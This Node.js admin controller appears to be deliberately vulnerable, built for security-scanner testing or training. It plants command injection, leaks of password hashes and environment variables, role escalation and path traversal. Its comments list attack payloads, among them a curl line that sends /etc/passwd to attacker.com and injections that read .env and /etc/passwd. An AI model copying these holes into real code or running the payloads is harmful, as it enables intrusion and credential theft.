'use strict';

const { exec }  = require('child_process');
const db        = require('../config/database');

/* ─────────────────────────────────────────────────────────────────
 * EXECUTE SYSTEM COMMAND
 * SAST Finding: CWE-78  — OS Command Injection
 * DAST Finding: Remote Code Execution via /admin/exec?cmd=
 *
 * Test payloads:
 *   ?cmd=whoami
 *   ?cmd=dir             (Windows)
 *   ?cmd=ls+-la          (Unix)
 *   ?cmd=type+C:\Windows\win.ini
 *   ?cmd=curl+http://attacker.com/$(cat+/etc/passwd|base64)
 *
 * Access is gated by requireAdmin middleware, but that middleware only
 * checks token validity — not admin role — so any authenticated user
 * can reach this endpoint.
 * ───────────────────────────────────────────────────────────────── */
const execCommand = (req, res, next) => {
  const { cmd = 'echo hello' } = req.query;

  // ❌ VULNERABLE: User-controlled `cmd` concatenated into shell string
  const shellCmd = 'echo "Executing: ' + cmd + '" && ' + cmd;
  // FIXME: Even more dangerous version — direct execution:
  // exec(cmd, callback);

  exec(shellCmd, { timeout: 10000 }, (err, stdout, stderr) => {
    if (err) {
      // FIXME: Error object (containing command) returned to client
      return res.status(500).json({
        error:   err.message,
        stderr,
        command: shellCmd
      });
    }
    res.json({
      output:  stdout,
      stderr,
      command: cmd,  // Echoes injected command back to client
      shell:   shellCmd
    });
  });
};

/* ─────────────────────────────────────────────────────────────────
 * ADMIN PANEL DATA
 * DAST Finding: CWE-200 — Exposure of Sensitive Information
 * Returns: all user records (incl. passwords), all env vars, memory usage
 * ───────────────────────────────────────────────────────────────── */
const getPanel = async (req, res, next) => {
  try {
    // FIXME: Returns password column for all users
    const users    = await db.query('SELECT id, username, email, password, role, created_at FROM users');
    const projects = await db.query('SELECT * FROM projects');

    res.json({
      users:    users.rows,    // ← Exposes password hashes
      projects: projects.rows,
      serverInfo: {
        node:     process.version,
        platform: process.platform,
        arch:     process.arch,
        uptime:   process.uptime(),
        memory:   process.memoryUsage(),
        cwd:      process.cwd(),
        // FIXME: Leaks ALL environment variables — including secrets!
        env:      process.env
      }
    });
  } catch (err) {
    next(err);
  }
};

/* ─────────────────────────────────────────────────────────────────
 * UPDATE USER ROLE
 * DAST Finding: CWE-269 — Improper Privilege Management
 *
 * This endpoint is under /admin but requireAdmin does NOT check roles.
 * Any authenticated user can escalate themselves to admin:
 *   POST /admin/users/role  { "userId": 2, "role": "admin" }
 * ───────────────────────────────────────────────────────────────── */
const updateUserRole = async (req, res, next) => {
  const { userId, role } = req.body;
  // FIXME: Should verify req.user.role === 'admin' AND userId !== req.user.id
  try {
    const result = await db.query(
      'UPDATE users SET role = $1 WHERE id = $2 RETURNING id, username, role',
      [role, userId]
    );
    res.json({ message: 'Role updated successfully', user: result.rows[0] });
  } catch (err) {
    next(err);
  }
};

/* ─────────────────────────────────────────────────────────────────
 * READ LOG FILES
 * SAST Finding: CWE-22  — Path Traversal / CWE-78 — Command Injection
 * The `file` query param is not validated before being passed to exec.
 * ───────────────────────────────────────────────────────────────── */
const readLogs = (req, res, next) => {
  // FIXME: Path traversal + command injection
  const { file = 'app.log' } = req.query;
  // Attacker can pass: ?file=../../.env  or  ?file=nonexistent; cat /etc/passwd
  exec(`type logs\\${file} 2>NUL || cat logs/${file} 2>/dev/null || echo "File not found"`,
    (err, stdout) => {
      res.json({ logs: stdout || '', file });
    }
  );
};

module.exports = { execCommand, getPanel, updateUserRole, readLogs };
